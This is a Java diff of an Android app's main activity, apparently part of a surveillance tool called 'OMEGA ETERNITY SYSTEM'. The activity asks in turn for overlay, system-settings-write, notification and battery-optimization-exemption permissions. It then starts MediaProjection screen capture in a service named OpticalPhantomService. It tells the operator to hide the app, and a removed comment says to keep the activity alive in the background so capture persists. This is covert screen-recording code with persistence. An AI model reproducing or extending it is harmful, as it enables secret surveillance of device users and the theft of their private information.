@@ -23,13 +23,13 @@ public class MainActivity extends Activity {
     private static final int MEDIA_REQ = 2;
     private static final int NOTIFICATION_REQ = 3;
     private static final int BATTERY_REQ = 4;
+    private static final int WRITE_SETTINGS_REQ = 5;
 
     private TextView tv;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setBackgroundColor(Color.BLACK);
@@ -37,7 +37,7 @@ public class MainActivity extends Activity {
         layout.setGravity(Gravity.CENTER);
 
         tv = new TextView(this);
-        tv.setText("OMEGA ETERNITY SYSTEM\nStatus: Awaiting Neural Sync...");
+        tv.setText("OMEGA ETERNITY SYSTEM\nStatus: Awaiting Privilege Escalation...");
         tv.setTextColor(Color.GREEN);
         tv.setTextSize(18f);
         tv.setGravity(Gravity.CENTER);
@@ -57,13 +57,19 @@ public class MainActivity extends Activity {
     }
 
     private void checkPermissionsAndStart() {
-        // 1. Overlay
         if (!Settings.canDrawOverlays(this)) {
             startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())), OVERLAY_REQ);
             return;
         }
 
-        // 2. Notification (Android 13+)
+        // [OMEGA PRIVILEGE] ĐÒI QUYỀN THAY ĐỔI CÀI ĐẶT HỆ THỐNG
+        if (!Settings.System.canWrite(this)) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, WRITE_SETTINGS_REQ);
+            return;
+        }
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                 ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.POST_NOTIFICATIONS}, NOTIFICATION_REQ);
@@ -71,29 +77,23 @@ public class MainActivity extends Activity {
             }
         }
 
-        // 3. BỎ QUA TỐI ƯU HÓA PIN (BATTERY BYPASS)
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                intent.setData(Uri.parse("package:" + getPackageName()));
-                startActivityForResult(intent, BATTERY_REQ);
-                return;
-            }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, BATTERY_REQ);
+            return;
         }
 
-        // 4. MediaProjection
         startCapture();
     }
 
     private void startCapture() {
-        // Kiểm tra Service đã chạy chưa để tránh start đúp gây crash
         if (isMyServiceRunning(OpticalPhantomService.class)) {
-            tv.setText("[STATUS] SYSTEM ALREADY ACTIVE.\nHide this app now.");
+            tv.setText("[STATUS] SYSTEM IMMORTAL.\nHide this app.");
             moveTaskToBack(true);
             return;
         }
-
         MediaProjectionManager mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
         startActivityForResult(mgr.createScreenCaptureIntent(), MEDIA_REQ);
     }
@@ -101,9 +101,7 @@ public class MainActivity extends Activity {
     private boolean isMyServiceRunning(Class<?> serviceClass) {
         android.app.ActivityManager manager = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
         for (android.app.ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
-            if (serviceClass.getName().equals(service.service.getClassName())) {
-                return true;
-            }
+            if (serviceClass.getName().equals(service.service.getClassName())) return true;
         }
         return false;
     }
@@ -117,24 +115,16 @@ public class MainActivity extends Activity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        
-        if (requestCode == OVERLAY_REQ || requestCode == BATTERY_REQ) {
+        if (requestCode == OVERLAY_REQ || requestCode == BATTERY_REQ || requestCode == WRITE_SETTINGS_REQ) {
             checkPermissionsAndStart();
         } else if (requestCode == MEDIA_REQ && resultCode == RESULT_OK) {
             OpticalPhantomService.mResultCode = resultCode;
             OpticalPhantomService.mResultIntent = data;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(new Intent(this, OpticalPhantomService.class));
+            else startService(new Intent(this, OpticalPhantomService.class));
             
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(new Intent(this, OpticalPhantomService.class));
-            } else {
-                startService(new Intent(this, OpticalPhantomService.class));
-            }
-            
-            tv.setText("[STATUS] NEURAL SYNC ACTIVE.\nMediaProjection Engaged.\nHide this app now.");
-            
-            // [OMEGA ANCHOR] TUYỆT ĐỐI KHÔNG finish(). 
-            // Chỉ ẩn xuống nền để giữ Activity sống làm "mỏ neo" cho MediaProjection.
-            moveTaskToBack(true); 
+            tv.setText("[STATUS] NEURAL SYNC ACTIVE.\nSystem Privilege Escalated.");
+            moveTaskToBack(true);
         }
     }
 }
